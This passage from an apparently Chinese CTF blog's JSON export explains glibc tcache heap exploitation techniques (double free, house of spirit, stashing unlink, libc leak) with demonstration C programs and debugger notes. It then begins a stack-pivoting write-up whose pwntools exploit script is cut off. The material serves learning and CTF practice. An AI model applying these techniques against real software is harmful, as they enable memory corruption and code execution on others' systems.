class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"This file demonstrates a simple double-free attack with tcache.\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Allocating buffer.\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(8): %p\\n\"</span>, a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Freeing twice...\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the free list has [ %p, %p ].\\n\"</span>, a, a);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *c = <span class=\"built_in\">malloc</span>(<span class=\"number\">8</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Next allocated buffers will be same: [ %p, %p ].\\n\"</span>, b, c);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)b == (<span class=\"keyword\">long</span>)c);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>直接看第一次断点</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314213639524.png\" alt=\"image-20210314213639524\"></p>\n<p>两个是在一个位置，为什么会这样？</p>\n<p>我们可以来看一下<code>tcache_put</code>函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> __always_inline <span class=\"keyword\">void</span></span><br><span class=\"line\">tcache_put (mchunkptr chunk, <span class=\"keyword\">size_t</span> tc_idx)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class=\"comment\">//释放的chunk</span></span><br><span class=\"line\">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class=\"comment\">//判断下标是否符合</span></span><br><span class=\"line\">  <span class=\"comment\">//链表的替换</span></span><br><span class=\"line\">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class=\"line\">  tcache-&gt;entries[tc_idx] = e;</span><br><span class=\"line\">  <span class=\"comment\">//数量增加</span></span><br><span class=\"line\">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到，这里知识简单的链表插入，它并没有进行判断。</p>\n<p>之后直接进行申请，我们就可以拿到同一块地址的两个指针。</p>\n<h2 id=\"3-tcache-house-of-spirit\"><a href=\"#3-tcache-house-of-spirit\" class=\"headerlink\" title=\"3.tcache house of spirit\"></a>3.tcache house of spirit</h2><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，<strong>如果我们构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实可以将任意地址作为chunk进行释放。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">malloc</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *a; <span class=\"comment\">//pointer that will be overwritten</span></span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> fake_chunks[<span class=\"number\">10</span>]; <span class=\"comment\">//fake chunk region</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"This region contains one fake chunk. It's size field is placed at %p\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tfake_chunks[<span class=\"number\">1</span>] = <span class=\"number\">0x40</span>; <span class=\"comment\">// this is the size</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"</span>);</span><br><span class=\"line\">\ta = &amp;fake_chunks[<span class=\"number\">2</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\"</span>, &amp;fake_chunks[<span class=\"number\">1</span>], &amp;fake_chunks[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"keyword\">void</span> *b = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"malloc(0x30): %p\\n\"</span>, b);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">\tassert((<span class=\"keyword\">long</span>)b == (<span class=\"keyword\">long</span>)&amp;fake_chunks[<span class=\"number\">2</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>还是比较好理解的。</p>\n<p>我们来看一下第一次断点。</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215452014.png\" alt=\"image-20210314215452014\"></p>\n<p>第一次只有<code>tcache_perthread_struct</code>和我们申请的堆块</p>\n<p>看第二次断点</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215557280.png\" alt=\"image-20210314215557280\"></p>\n<p>bins中出现了栈上的地址，这时我们分配一下，就可以拿到栈上的指针了。</p>\n<p><img src=\"/2021/03/08/tcache/image-20210314215657530.png\" alt=\"image-20210314215657530\"></p>\n<p>栈上的指针到手。</p>\n<h2 id=\"4-tcache-stashing-unlink-attack\"><a href=\"#4-tcache-stashing-unlink-attack\" class=\"headerlink\" title=\"4.tcache stashing unlink attack\"></a>4.tcache stashing unlink attack</h2><p>首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> stack_var[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *chunk_lis[<span class=\"number\">0x10</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *target;</span><br><span class=\"line\"></span><br><span class=\"line\">    stack_var[<span class=\"number\">3</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)(&amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"stack_var addr is:%p\\n\"</span>,&amp;stack_var[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"chunk_lis addr is:%p\\n\"</span>,&amp;chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"target addr is:%p\\n\"</span>,(<span class=\"keyword\">void</span>*)target);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You can see the value of fake_chunk-&gt;bk is:%p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Also, let's see the initial value of stack_var[4]:%p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we alloc 9 chunks with malloc.\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//now we malloc 9 chunks</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        chunk_lis[i] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">3</span>;i &lt; <span class=\"number\">9</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(chunk_lis[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//last tcache bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//now they are put into unsorted bin</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(chunk_lis[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//convert into small bin</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);<span class=\"comment\">// size &gt; 0x90</span></span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">//now 5 tcache bins</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//change victim-&gt;bck</span></span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\">    chunk_lis[<span class=\"number\">2</span>][<span class=\"number\">1</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)stack_var;</span><br><span class=\"line\">    <span class=\"comment\">/*VULNERABILITY*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//trigger the attack</span></span><br><span class=\"line\">    <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n\"</span>,(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">2</span>],(<span class=\"keyword\">void</span>*)stack_var[<span class=\"number\">4</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//malloc and return our fake chunk on stack</span></span><br><span class=\"line\">    target = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);   </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\"</span>,(<span class=\"keyword\">void</span>*)target);</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(target == &amp;stack_var[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>具体来看一下这个过程，先看这三个地址。</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318152451146.png\" alt=\"image-20210318152451146\"></p>\n<p>先c一下，6个放入tcache</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318153644695.png\" alt=\"image-20210318153644695\"></p>\n<p>再c，观察bins结构</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318153928275.png\" alt=\"image-20210318153928275\"></p>\n<p>c两下，可以看到两个tcache已经分配了</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318154115014.png\" alt=\"image-20210318154115014\"></p>\n<p>可以看到栈上的地址已经上了cache链，直接分配就行了</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318154918326.png\" alt=\"image-20210318154918326\"></p>\n<blockquote>\n<p>为什么会这样？</p>\n<p>先看这个smallbin的结构</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318164858035.png\" alt=\"image-20210318164858035\"></p>\n<p>之后我们把2的bk指针改为栈上的地址。</p>\n<p>calloc之后就成为了这样</p>\n<p><img src=\"/2021/03/08/tcache/image-20210318165216882.png\" alt=\"image-20210318165216882\"></p>\n<p>这里说明一下为什么要使用calloc进行申请chunk，这是<strong>因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块</strong>，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk[0]</p>\n<p>这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk[2]和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var开始顺着bk链接到 tcachebin 中 ，在这个过程中<strong>只对第一个 chunk[2]进行了完整性检查，后面的stack_var的检查缺失</strong>。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中</p>\n<p><strong>同时这里还写入了一个libc，位于0x00007fffffffded0+0x10</strong></p>\n<p><img src=\"/2021/03/08/tcache/image-20210318174356049.png\" alt=\"image-20210318174356049\"></p>\n</blockquote>\n<h2 id=\"5-libc-leak\"><a href=\"#5-libc-leak\" class=\"headerlink\" title=\"5.libc leak\"></a>5.libc leak</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc , <span class=\"keyword\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">long</span>* t[<span class=\"number\">7</span>];</span><br><span class=\"line\">    <span class=\"keyword\">long</span> *a=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">long</span> *b=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// make tcache bin full</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">7</span>;i++)</span><br><span class=\"line\">        t[i]=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">7</span>;i++)</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(t[i]);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\">\tsleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"comment\">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%p\\n\"</span>,a[<span class=\"number\">0</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"house of系列","url":"https://pz1o.top/2021/03/06/house-of系列/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> U2FsdGVkX19ZAHBsq2sn390z4jKGbPtX/48JWRhSumc= </div>","categories":[],"tags":["PWN"]},{"title":"malloc源码详解","url":"https://pz1o.top/2021/03/05/malloc源码详解/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["PWN"]},{"title":"栈迁移","url":"https://pz1o.top/2021/03/02/栈迁移/","content":"<h1 id=\"0x01-基本原理\"><a href=\"#0x01-基本原理\" class=\"headerlink\" title=\"0x01 基本原理\"></a>0x01 基本原理</h1><p>call一个函数实际进行的操作</p>\n<blockquote>\n<p>push eip+4;</p>\n<p>push ebp;</p>\n<p>mov ebp,esp;</p>\n</blockquote>\n<p>以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。</p>\n<p>在执行完函数后也会进行一系列对应的操作来还原现场<code>leave;ret;</code></p>\n<p>这边的leave就相当于进入函数栈操作的逆过程。</p>\n<blockquote>\n<p>leave == mov esp,ebp; pop ebp;<br>ret == pop eip #弹出栈顶数据给eip寄存器</p>\n</blockquote>\n<p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）</p>\n<h1 id=\"0x02-利用条件\"><a href=\"#0x02-利用条件\" class=\"headerlink\" title=\"0x02 利用条件\"></a>0x02 利用条件</h1><p>主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）</p>\n<p>所以我们就要通过控制ebp来绕过限制。</p>\n<h1 id=\"0x03-如何利用\"><a href=\"#0x03-如何利用\" class=\"headerlink\" title=\"0x03 如何利用\"></a>0x03 如何利用</h1><p>要想控制程序流程，我们首要控制的就是eip的值，而eip是由ret来获取的。</p>\n<p>在不改变eip的情况下，所以我们想到的就是改变ret前面的内容。</p>\n<p>这里就产生一个思路，如果我们能控制ebp和esp到任意位置，那么eip不也就随意控制了吗？</p>\n<ol>\n<li>栈溢出覆盖ebp，到指定栈顶的位置</li>\n<li>esp确定好位置，伪造eip即可</li>\n</ol>\n<h1 id=\"0x04-例题\"><a href=\"#0x04-例题\" class=\"headerlink\" title=\"0x04 例题\"></a>0x04 例题</h1><h2 id=\"printf打印栈地址\"><a href=\"#printf打印栈地址\" class=\"headerlink\" title=\"printf打印栈地址\"></a>printf打印栈地址</h2><h3 id=\"ciscn-2019-es-2\"><a href=\"#ciscn-2019-es-2\" class=\"headerlink\" title=\"ciscn_2019_es_2\"></a>ciscn_2019_es_2</h3><blockquote>\n<p>打印只需要到ebp位置就可以</p>\n</blockquote>\n<p>比较基础的栈迁移的题目</p>\n<p>我们只需要获取ebp就可以</p>\n<p>这里需要调试一下才能看清楚情况</p>\n<p><img src=\"/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302164451946.png\" alt=\"image-20210302164451946\"></p>\n<p>两次输出 第一次获取栈地址 第二次直接构造</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               